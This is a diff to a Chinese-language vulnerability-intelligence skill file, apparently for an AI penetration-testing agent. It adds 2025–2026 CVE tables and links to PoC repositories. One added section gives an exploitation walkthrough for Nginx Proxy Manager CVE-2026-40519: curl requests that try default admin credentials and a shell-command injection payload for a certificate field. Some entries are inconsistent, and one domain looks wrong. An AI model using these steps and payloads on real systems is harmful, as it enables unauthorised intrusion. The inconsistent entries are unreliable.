@@ -7,9 +7,21 @@ related_skills: [vuln-intel, exploit-db-integration, pentest-unified-engine, aut
 
 # 2025-2026 漏洞情报库
 
+> 微信公众号漏洞情报提取技巧(360漏洞研究院专辑等)见 `references/wechat-vuln-intel-extraction.md`。
+> 360漏洞研究院专辑209篇学习笔记见 `references/360-vuln-album-learning.md`。
+
 ## 高价值CVE PoC (已验证可利用)
 
 ### RCE类
+
+| CVE | 产品 | 类型 | PoC | 利用方式 |
+|-----|------|------|-----|---------|
+| CVE-2026-40519 | Nginx Proxy Manager | 命令注入RCE | 未公开(修复commit a5db5ed) | setupCertbotPlugins() dns_provider_credentials→child_process.exec()无转义，需管理员权限 |
+| CVE-2025-47981 | Windows NEGOEX | 堆溢出RCE(蠕虫级) | 未公开 | SPNEGO扩展协商协议堆缓冲区溢出，无需认证/交互，影响SMB(445)/RDP(3389)/RPC(135)，CVSS 9.8 |
+| CVE-2025-5120 | smolagents (Hugging Face) | 沙箱逃逸RCE | huntr.com/bounties/63ab1cfe | local_python_executor.py沙箱绕过，通过内置函数访问受限模块(sys等)，CVSS 9.8 |
+| CVE-2025-40596 | SonicWall SMA 100 | 栈溢出RCE | 未公开(POC已公开) | HTTP URL解析缺长度校验，认证前漏洞，影响SMA 210/410/500v <=10.2.1.15-81sv |
+| CVE-2025-40597 | SonicWall SMA 100 | 堆溢出RCE | 未公开(POC已公开) | HTTP header边界检查不当，认证前漏洞 |
+| CVE-2025-6514 | mcp-remote | OAuth代理RCE | 未公开 | 受信任OAuth proxy执行任意指令，影响超43万环境，窃取API key/云凭据 |
 
 | CVE | 产品 | 类型 | PoC | 利用方式 |
 |-----|------|------|-----|---------|
@@ -27,6 +39,36 @@ related_skills: [vuln-intel, exploit-db-integration, pentest-unified-engine, aut
 | CVE-2025-29927 | Next.js | 中间件认证绕过 | github.com/alihussainzada/CVE-2025-29927-PoC | 内部中间件头信任滥用绕过授权 |
 | CVE-2025-0108 | PAN-OS | 管理界面认证绕过 | github.com/FOLKS-iwd/CVE-2025-0108-PoC | 管理接口认证绕过 |
 | CVE-2025-27515 | Laravel | 文件上传验证绕过 | github.com/joaovicdev/EXPLOIT-CVE-2025-27515 | 通配符数组上传验证绕过 |
+
+### XSS类
+
+| CVE | 产品 | 类型 | 利用方式 |
+|-----|------|------|---------|
+| CVE-2025-40598 | SonicWall SMA 100 | 反射型XSS | cgi-bin跨站脚本，认证前漏洞，可劫持会话/窃取凭据 |
+
+### SQL注入类
+
+### 在野利用/APT武器化
+
+| CVE | 产品 | 类型 | 状态 | 利用方式 |
+|-----|------|------|------|---------|
+| CVE-2025-33053 | Windows WebDAV | RCE | 在野利用,APT武器化,PoC已公开 | 强制设备从恶意WebDAV服务器远程执行代码，无需本地落地文件，隐蔽性极高 |
+
+### 蠕虫级漏洞
+
+| CVE | 产品 | 类型 | CVSS | 利用方式 |
+|-----|------|------|------|---------|
+| CVE-2025-47981 | Windows NEGOEX | 堆溢出RCE | 9.8 | SPNEGO扩展协商协议，无需认证/交互，影响SMB(445)/RDP(3389)/RPC(135)，蠕虫级自动传播，禁用PKU2U可缓解 |
+
+### 微信客户端漏洞
+
+| 漏洞 | 影响版本 | 类型 | 利用方式 |
+|------|----------|------|---------|
+| 微信Win目录穿越+RCE | <=3.9 | 目录穿越→RCE | 聊天记录文件自动下载未校验路径→目录穿越到系统启动目录→开机自启动→RCE，用户无感知 |
+
+| CVE | 产品 | 类型 | 利用方式 |
+|-----|------|------|---------|
+| CVE-2025-25257 | Fortinet FortiWeb | SQL注入 | FortiWeb SQL注入，已复现 |
 
 ### 文件上传类
 
@@ -54,6 +96,32 @@ related_skills: [vuln-intel, exploit-db-integration, pentest-unified-engine, aut
 | github.com/GhostTroops/TOP | - | 活跃更新的CVE PoC集合 |
 
 ## 攻击技术方法论
+
+### 0. Nginx Proxy Manager 命令注入 (CVE-2026-40519)
+
+**原理**: backend/setup.js 的 setupCertbotPlugins() 函数将 dns_provider_credentials 直接拼入 child_process.exec()，无任何转义
+
+**利用条件**:
+- 管理员账号（默认 admin@example.com/changeme）
+- certificates:manage 权限
+- 版本 2.9.14 ~ 2.15.1
+
+**检测步骤**:
+```bash
+# 1. 确认NPM版本
+curl -sk https://target/api/ | head -5
+
+# 2. 测试默认凭据
+curl -sk -X POST "https://target/api/tokens" \
+  -H "Content-Type: application/json" \
+  -d '{"identity":"admin@example.com","secret":"changeme"}'
+
+# 3. 利用: 创建DNS证书时在credentials字段注入payload
+# POST /api/nginx/certificates
+# body中dns_provider_credentials字段注入: `; whoami > /tmp/pwned;`
+```
+
+**修复**: 升级 > 2.15.1 或从 develop 分支编译
 
 ### 1. Java反序列化攻击链 (Tomcat CVE-2025-24813)
 
@@ -341,6 +409,7 @@ curl -sk "https://target/fetch?url=http://100.100.100.200/latest/meta-data/"
 
 ## 参考资源
 
+### PoC/漏洞库
 - PayloadsAllTheThings: github.com/swisskyrepo/PayloadsAllTheThings
 - ysoserial: github.com/frohoff/ysoserial
 - jwt_tool: github.com/ticarpi/jwt_tool
@@ -348,3 +417,13 @@ curl -sk "https://target/fetch?url=http://100.100.100.200/latest/meta-data/"
 - graphql-cop: github.com/dolevf/graphql-cop
 - DVGA: github.com/dolevf/Damn-Vulnerable-GraphQL-Application
 - OWASP Business Logic: github.com/OWASP/www-project-top-10-for-business-logic-abuse
+
+### 中文漏洞情报源
+- 360漏洞研究院公众号: 漏洞风险通告专辑(209+篇), 微信搜索"360漏洞研究院"
+- CN-SEC中文网: cn-sec.com (微信文章镜像, 可直接提取)
+- 奇安信CERT: qianxin.com (漏洞预警+分析)
+- 安天CERT: antiy.com (APT分析+漏洞通告)
+- 微步在线: threatbook.com (威胁情报)
+- 360安全大脑: ti.360.cn (漏洞库+测绘)
+- CNVD: cnvd.org.cn (国家漏洞库)
+- Sploitus: sploitus.exploit.com (CVE+PoC搜索引擎)
